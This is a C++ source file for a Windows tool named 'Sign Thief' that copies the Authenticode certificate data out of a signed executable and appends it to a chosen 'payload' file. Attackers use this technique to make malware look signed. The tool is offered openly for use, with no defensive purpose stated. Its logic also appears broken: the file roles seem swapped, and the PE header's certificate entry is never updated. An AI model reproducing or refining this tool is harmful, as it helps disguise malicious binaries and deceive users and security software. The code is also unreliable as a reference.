#include "main.hpp"
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <Windows.h>
#include <string>
#include <commdlg.h>

signature_thief::signature_thief(std::filesystem::path path_to_file) : m_source_path(path_to_file) {}

std::optional<std::string> signature_thief::load_file() noexcept {
    std::ifstream file(m_source_path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return "Error opening file: " + m_source_path.string();
    }

    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    m_file.resize(size);
    file.read(reinterpret_cast<char*>(m_file.data()), size);

    return std::nullopt;
}

void signature_thief::extract_certificate(std::filesystem::path source_path) {
    std::ifstream file(source_path, std::ios::binary | std::ios::ate);

    if (!file.is_open()) {
        throw std::runtime_error("Error opening file: " + source_path.string());
    }

    auto size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);

    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    auto cert_data_begin = buffer.begin() + cert_info.VirtualAddress;
    auto cert_data_end = cert_data_begin + cert_info.Size;

    std::span<uint8_t> cert_data(cert_data_begin, cert_data_end);
    m_cert.assign(cert_data.begin(), cert_data.end());
}

void signature_thief::append_certificate_to_payload(std::span<uint8_t> signature_data) {
    m_file.insert(m_file.end(), signature_data.begin(), signature_data.end());
}

std::wstring open_file_dialog(const std::wstring& title, const std::wstring& filter) {
    OPENFILENAME ofn;
    wchar_t szFile[260];

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = GetConsoleWindow();
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
    ofn.lpstrFilter = filter.c_str();
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.lpstrTitle = title.c_str();
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_OVERWRITEPROMPT;

    if (GetOpenFileName(&ofn) == TRUE) {
        return szFile;
    }

    return L"";
}

void handle_drag_and_drop() {
    std::wstring signed_pe_path = open_file_dialog(L"Select Signed File", L"All Files\0*.*\0");
    if (signed_pe_path.empty()) {
        std::wcerr << L"Error: Signed file not selected." << std::endl;
        return;
    }

    std::wstring payload_path = open_file_dialog(L"Select Payload File", L"All Files\0*.*\0");
    if (payload_path.empty()) {
        std::wcerr << L"Error: Payload file not selected." << std::endl;
        return;
    }

    std::wstring output_path = open_file_dialog(L"Select Output Location", L"All Files\0*.*\0");
    if (output_path.empty()) {
        std::wcerr << L"Error: Output file not selected." << std::endl;
        return;
    }

    signature_thief thief(signed_pe_path);
    auto result = thief.load_file();
    if (result) {
        std::cerr << "Error appeared: " << *result << "\n";
        return;
    }

    thief.extract_certificate(payload_path);
    auto cert = thief.get_certificate();
    thief.append_certificate_to_payload(cert);

    auto binary = thief.get_binary();

    std::ofstream output_file(output_path, std::ios::binary);
    if (!output_file.is_open()) {
        throw std::runtime_error("Error opening output file: " + std::string(output_path.begin(), output_path.end()));
    }
    output_file.write(reinterpret_cast<const char*>(binary.data()), binary.size());
    output_file.close();

    std::wcout << L"Signature appended successfully." << std::endl;
}

int main() {
    SetConsoleTitleA("Sign Thief - V.1.0.0");

    try {
        handle_drag_and_drop();
        return EXIT_SUCCESS;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
}
